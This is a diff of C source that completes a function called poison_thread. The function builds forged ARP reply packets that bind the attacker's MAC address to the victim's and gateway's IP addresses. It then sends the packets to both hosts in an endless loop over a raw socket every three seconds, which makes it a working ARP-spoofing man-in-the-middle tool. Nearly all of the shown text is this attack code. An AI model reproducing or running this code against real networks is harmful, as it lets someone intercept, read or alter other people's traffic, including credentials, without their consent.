@@ -59,18 +59,58 @@ void *poison_thread(void *arg)
     memcpy(arp_victim->arp_tpa, &ctx->victim_ip, 4);
 
 
-    // --------------------------------GATEWAY----------------------------------//
+    // --------------------------------GATEWAY---------------------------------- //
 
     memcpy(eth_gateway->ether_dhost, ctx->gateway_mac, 6);
     memcpy(eth_gateway->ether_shost, ctx->attacker_mac, 6);
     eth_gateway->ether_type = htons(ETH_P_ARP);
 
+    arp_gateway->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+    arp_gateway->ea_hdr.ar_pro = htons(ETH_P_IP);
+    arp_gateway->ea_hdr.ar_hln = ETH_ALEN;
+    arp_gateway->ea_hdr.ar_pln = 4;
+    arp_gateway->ea_hdr.ar_op  = htons(ARPOP_REPLY);
     
+    memcpy(arp_gateway->arp_sha, ctx->attacker_mac, 6);
+    memcpy(arp_gateway->arp_spa, &ctx->victim_ip, 4);
+    memcpy(arp_gateway->arp_tha, ctx->gateway_mac, 6);
+    memcpy(arp_gateway->arp_tpa, &ctx->gateway_ip, 4);
+
+    // ------------------------------------------------------------------------- //
+
+    int packet_size = sizeof(struct ether_header) + sizeof(struct ether_arp); 
+    socklen_t addr_len = sizeof(struct sockaddr_ll);
+
+    while (1)
+    {
+        // --------------------------------------sendto VICTIM-------------------------------------- //
+        
+        int bytes_send_victim = sendto(ctx->raw_sock, buffer_victim,
+                                       packet_size, 0, (struct sockaddr *)&socket_address_victim,
+                                       addr_len);
+
+        if (bytes_send_victim == -1)
+        {
+            perror("ERROR ! (sendto - victim)");
+            exit(EXIT_FAILURE);
+        }
+        
+        // --------------------------------------sendto GATEWAY-------------------------------------- //    
+
+        int bytes_send_gateway = sendto(ctx->raw_sock, buffer_gateway,
+                                        packet_size, 0, (struct sockaddr *)&socket_address_gateway,
+                                        addr_len);
+        
+        if (bytes_send_gateway == -1)
+        {
+            perror("ERROR ! (sendto - gateway)");
+            exit(EXIT_FAILURE);
+        }
+
+        sleep(3);
     
+    }
 
-
-
-
-
-
+    return NULL; 
+    
 }
